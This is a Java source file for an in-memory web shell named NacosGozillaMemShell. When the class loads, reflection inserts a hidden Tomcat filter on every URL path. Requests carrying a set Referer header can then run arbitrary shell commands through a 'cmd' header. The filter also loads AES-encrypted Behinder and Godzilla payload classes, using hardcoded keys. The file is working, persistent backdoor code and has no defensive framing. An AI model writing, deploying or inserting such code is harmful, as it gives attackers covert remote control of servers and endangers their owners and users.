import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.apache.tomcat.util.http.Parameters;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

public class NacosGozillaMemShell {
    final String name="Boogipop";
    // 第一个构造函数
    String uri;
    String serverName="localhost";
    StandardContext standardContext;
    static {
        try {
            new NacosGozillaMemShell();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    String xc = "3c6e0b8a9c15224a"; // key
    String pass = "pass";
    String md5 = md5(pass + xc);
    Class payload;
    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public NacosGozillaMemShell() throws Exception {
        getStandardContext();
    }

    public void getStandardContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, ClassNotFoundException {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        return;
                    }
                }
                Object service = getField(getField(getField(
                        getField(getField(jioEndPoint, "handler"), "proto"),
                        "adapter"), "connector"), "service");
                Object engine = null;
                try {
                    engine = getField(service, "container");
                } catch (Exception e) {
                }
                if (engine == null) {
                    engine = getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                Object standardHost = children.get(this.serverName);

                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()) {
                    String contextKey = (String) iterator.next();
                    standardContext = (StandardContext) children.get(contextKey);
                    Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
                    Configs.setAccessible(true);
                    Map filterConfigs = (Map) Configs.get(standardContext);
                    if (filterConfigs.get(name) == null){
                        //开始添加Filter过滤器
                        Filter filter = new Filter() {
                            @Override
                            public void init(FilterConfig filterConfig) throws ServletException {

                            }

                            @Override
                            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                                HttpServletRequest request = (HttpServletRequest) servletRequest;
                                HttpServletResponse response = (HttpServletResponse) servletResponse;
                                //定义了恶意的FIlter过滤器，在dofilter方法执行恶意代码
                                try {
                                    // 入口
                                    if (request.getHeader("Referer").equalsIgnoreCase("https://www.boogipop.com/")) {
                                        Object lastRequest = request;
                                        Object lastResponse = response;
                                        // 解决包装类RequestWrapper的问题
                                        // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
                                        if (!(lastRequest instanceof RequestFacade)) {
                                            Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                                            lastRequest = getRequest.invoke(request);
                                            while (true) {
                                                if (lastRequest instanceof RequestFacade) break;
                                                lastRequest = getRequest.invoke(lastRequest);
                                            }
                                        }
                                        // 解决包装类ResponseWrapper的问题
                                        if (!(lastResponse instanceof ResponseFacade)) {
                                            Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                                            lastResponse = getResponse.invoke(response);
                                            while (true) {
                                                if (lastResponse instanceof ResponseFacade) break;
                                                lastResponse = getResponse.invoke(lastResponse);
                                            }
                                        }
                                        // cmdshell
                                        if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                                            String cmd = request.getHeader("cmd");
                                            if (cmd != null && !cmd.isEmpty()) {
                                                String[] cmds = null;
                                                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                                    cmds = new String[]{"cmd", "/c", cmd};
                                                } else {
                                                    cmds = new String[]{"/bin/bash", "-c", cmd};
                                                }
                                                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                                                ((ResponseFacade) lastResponse).getWriter().println(result);
                                            }
                                        } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                                            if (request.getMethod().equals("POST")) {
                                                // 创建pageContext
                                                HashMap pageContext = new HashMap();

                                                // lastRequest的session是没有被包装的session!!
                                                HttpSession session = ((RequestFacade) lastRequest).getSession();
                                                pageContext.put("request", lastRequest);
                                                pageContext.put("response", lastResponse);
                                                pageContext.put("session", session);
                                                // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                                                String payload = request.getReader().readLine();
                                                if (payload == null || payload.isEmpty()) {
                                                    payload = "";
                                                    // 拿到真实的Request对象而非门面模式的RequestFacade
                                                    Field field = lastRequest.getClass().getDeclaredField("request");
                                                    field.setAccessible(true);
                                                    Request realRequest = (Request) field.get(lastRequest);
                                                    // 从coyoteRequest中拼接body参数
                                                    Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                                                    coyoteRequestField.setAccessible(true);
                                                    org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                                                    Parameters parameters = coyoteRequest.getParameters();
                                                    Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                                                    paramHashValues.setAccessible(true);
                                                    LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                                                    Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                                                    while (iterator.hasNext()) {
                                                        Map.Entry<String, ArrayList<String>> next = iterator.next();
                                                        String paramKey = next.getKey().replaceAll(" ", "+");
                                                        ArrayList<String> paramValueList = next.getValue();
                                                        if (paramValueList.size() == 0) {
                                                            payload = payload + paramKey;
                                                        } else {
                                                            payload = payload + paramKey + "=" + paramValueList.get(0);
                                                        }
                                                    }
                                                }

//                        System.out.println(payload);
                                                // 冰蝎逻辑
                                                String k = "e45e329feb5d925b"; // rebeyond
                                                session.putValue("u", k);
                                                Cipher c = Cipher.getInstance("AES");
                                                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                                                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                                method.setAccessible(true);
                                                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                                                Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                                                evilclass.newInstance().equals(pageContext);
                                            }
                                        } else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
                                            // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                                            byte[] data = base64Decode(request.getParameter(pass));
                                            data = x(data, false);
                                            if (payload == null) {
                                                URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                                                Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                                                defMethod.setAccessible(true);
                                                payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                                            } else {
                                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                                Object f = payload.newInstance();
                                                f.equals(arrOut);
                                                f.equals(data);
                                                f.equals(request);
                                                response.getWriter().write(md5.substring(0, 16));
                                                f.toString();
                                                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                                                response.getWriter().write(md5.substring(16));
                                            }
                                        }
                                        return;
                                    }
                                } catch (Exception e) {
//            e.printStackTrace();
                                }
                                filterChain.doFilter(servletRequest, servletResponse);
                            }

                            @Override
                            public void destroy() {

                            }

                        };

                        FilterDef filterDef = new FilterDef();
                        filterDef.setFilter(filter);
                        filterDef.setFilterName(name);
                        filterDef.setFilterClass(filter.getClass().getName());
                        /**
                         * 将filterDef添加到filterDefs中
                         */
                        standardContext.addFilterDef(filterDef);

                        FilterMap filterMap = new FilterMap();
                        filterMap.addURLPattern("/*");
                        filterMap.setFilterName(name);
                        filterMap.setDispatcher(DispatcherType.REQUEST.name());

                        standardContext.addFilterMapBefore(filterMap);
                        /**
                         * 添加FilterMap
                         */
                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                        filterConfigs.put(name,filterConfig);
                        /**
                         * 反射获取ApplicationFilterConfig对象，往filterConfigs中放入filterConfig
                         */
                        System.out.println("Inject Success !");
                    }
                    return;
                }
            }
        }
    }

    public static void main(String[] args) {

    }
}